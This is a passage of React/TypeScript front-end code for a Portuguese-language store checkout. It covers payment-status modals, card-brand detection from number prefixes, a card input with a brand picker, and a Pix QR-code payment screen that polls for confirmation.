                      <Link to="/" className="mt-6 block w-full rounded bg-primary py-3 font-bold text-primary-foreground">Voltar para a página inicial</Link>
                    </div>
                  </div>
                )}
                {cartaoOk && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/50 p-6">
                    <div className="w-full max-w-sm rounded-lg bg-background p-6 text-center shadow-xl">
                      <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-primary/15 text-3xl font-bold text-primary">✓</div>
                      <h3 className="mt-4 text-xl font-bold text-foreground">Pedido recebido!</h3>
                      <p className="mt-2 text-sm text-muted-foreground">Recebemos seu pedido. Em breve entraremos em contato pelo e-mail informado.</p>
                      <Link to="/" className="mt-6 block w-full rounded bg-primary py-3 font-bold text-primary-foreground">Voltar à loja</Link>
                    </div>
                  </div>
                )}
                {indisp && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/50 p-6" onClick={() => setIndisp(false)}>
                    <div className="w-full max-w-sm rounded-lg bg-background p-6 text-center shadow-xl" onClick={(e) => e.stopPropagation()}>
                      <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-primary/15 text-3xl font-bold text-primary">!</div>
                      <h3 className="mt-4 text-xl font-bold text-foreground">{indisp === "erro" ? "Erro de processamento" : "Forma de pagamento indisponível"}</h3>
                      <p className="mt-2 text-sm text-muted-foreground">{indisp === "erro" ? "Não foi possível processar seu pagamento. Por favor, tente novamente ou escolha outra forma de pagamento." : "No momento, esta forma de pagamento está indisponível. Por favor, escolha outra forma de pagamento para finalizar sua compra."}</p>
                      <button onClick={() => setIndisp(false)} className="mt-6 w-full rounded bg-primary py-3 font-bold text-primary-foreground">Escolher outra forma</button>
                    </div>
                  </div>
                )}
              </div>
            </>
          )}
        </div>
        <div className="mt-10"><StoreFooter /></div>
      </div>
    </div>
  );
}

function detectBrand(n: string): number {
  const d = n.replace(/\D/g, "");
  if (!d) return -1;
  if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(d)) return 5;
  if (/^(606282|3841)/.test(d)) return 2;
  if (/^3[47]/.test(d)) return 1;
  if (/^3(0[0-5]|[68])/.test(d)) return 3;
  if (/^(5[1-5]|2[2-7])/.test(d)) return 4;
  if (/^4/.test(d)) return 0;
  return -1;
}

function CardBrandPicker({ name = "bandeira", cred, num, sel: selNome, onNum, onSel }: { name?: string; num: string; sel: string; onNum: (v: string) => void; onSel: (v: string) => void; cred?: boolean }) {
  const sel = Math.max(0, BANDEIRAS.indexOf(selNome));
  const setNum = onNum;
  const setSel = (k: number) => onSel(BANDEIRAS[k] ?? "VISA");
  const brands: [string, string][] = [["VISA", b0], ["American Express", b1], ["Hipercard", b2], ["Diners", b3], ["Mastercard", b4], ["Elo", b5]];
  return (
    <>
      <label className="block">Número do cartão</label>
      <input
        inputMode="numeric"
        maxLength={19}
        autoComplete="cc-number"
        value={num}
        onChange={(e) => {
          const v = e.target.value.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
          setNum(v);
          const b = detectBrand(v);
          if (b >= 0) setSel(b);
        }}
        className="mt-1 w-full rounded border bg-background px-3 py-2 text-base"
      />
      {cred ? (
        <label className="mt-4 flex w-20 flex-col items-center gap-1"><input type="radio" checked readOnly className="h-4 w-4" /><span className="text-xs">CredSystem</span></label>
      ) : <div className="mt-5 grid grid-cols-6 gap-1 text-center">
        {brands.map(([b, src], k) => (
          <label key={b} className="flex cursor-pointer flex-col items-center gap-1">
            <input type="radio" name={name} checked={sel === k} onChange={() => setSel(k)} className="h-4 w-4" />
            <img src={src} alt={b} className="w-full object-contain" />
          </label>
        ))}
      </div>}
    </>
  );
}

function PixTela({ pix, copiado, onCopy, onClose }: { pix: { hash?: string; pixCode: string; qrCode: string | null; amount: number }; copiado: boolean; onCopy: () => void; onClose: () => void }) {
  const [seg, setSeg] = useState(600);
  useEffect(() => { const t = setInterval(() => setSeg((s) => Math.max(0, s - 1)), 1000); return () => clearInterval(t); }, []);
  const checar = useServerFn(checarPix);
  const [pago, setPago] = useState(false);
  useEffect(() => {
    if (!pix.hash || pago) return;
    const t = setInterval(async () => { try { const r = await checar({ data: { hash: pix.hash! } }); if (r.pago) { setPago(true); cart.clear(); } } catch { /* tenta de novo */ } }, 5000);
    return () => clearInterval(t);
  }, [pix.hash, pago]);
  if (pago) return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/50 p-6">
      <div className="w-full max-w-sm rounded-lg bg-background p-6 text-center shadow-xl">
        <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-green-100 text-4xl font-bold text-green-600">✓</div>
        <h3 className="mt-4 text-xl font-bold text-foreground">Pagamento aprovado!</h3>
        <p className="mt-2 text-sm text-muted-foreground">Recebemos seu pagamento. Em breve entraremos em contato com você.</p>
        <Link to="/" className="mt-6 block w-full rounded bg-primary py-3 font-bold text-primary-foreground">Voltar à loja</Link>
      </div>
    </div>
  );
  const qr = pix.qrCode
    ? (pix.qrCode.startsWith("data:") || pix.qrCode.startsWith("http") ? pix.qrCode : `data:image/png;base64,${pix.qrCode}`)
    : `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(pix.pixCode)}`;
  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-background">
      <div className="sticky top-0 border-b bg-background py-4 text-center">
        <p className="text-5xl font-light tracking-wide" style={{ color: "#32BCAD" }}>◆ pix</p>
        <p className="mt-1 text-sm text-muted-foreground">Tempo restante {Math.floor(seg / 60)}:{String(seg % 60).padStart(2, "0")}</p>
      </div>
      <div className="mx-auto max-w-xs space-y-6 px-4 py-6">
        <div className="rounded bg-muted p-4 text-center">
          <p className="text-left font-bold text-foreground">Escaneie o QR Code</p>
          <img src={qr} alt="QR Code Pix" className="mx-auto mt-3 h-52 w-52 bg-background p-2" />
          <p className="mt-4 text-left font-bold text-foreground">Copie o código de pagamento</p>
          <input readOnly value={pix.pixCode} className="mt-3 w-full truncate bg-background px-3 py-2 text-sm" />
          <button onClick={onCopy} className="mt-2 w-full rounded bg-blue-700 py-3 font-bold text-background">{copiado ? "CÓDIGO COPIADO!" : "COPIAR CÓDIGO ⧉"}</button>
          <p className="mt-3 text-sm text-foreground">Valor: <b>{brl(pix.amount / 100)}</b></p>
        </div>
        <div className="rounded bg-muted p-4">
          <p className="font-bold text-foreground">Cole no app do seu banco</p>
          <p className="text-sm text-foreground">Abra o app do seu banco na opção Pix, cole o código, confira os dados e pague.</p>
          <p className="mt-4 flex items-center gap-2 rounded bg-green-50 p-3 text-sm text-foreground"><span className="inline-block h-5 w-5 animate-spin rounded-full border-2 border-green-500 border-t-transparent" />Aguardando pagamento</p>
        </div>
        <button onClick={onClose} className="w-full text-sm text-muted-foreground underline">Fechar</button>
      </div>
    </div>
  );
}
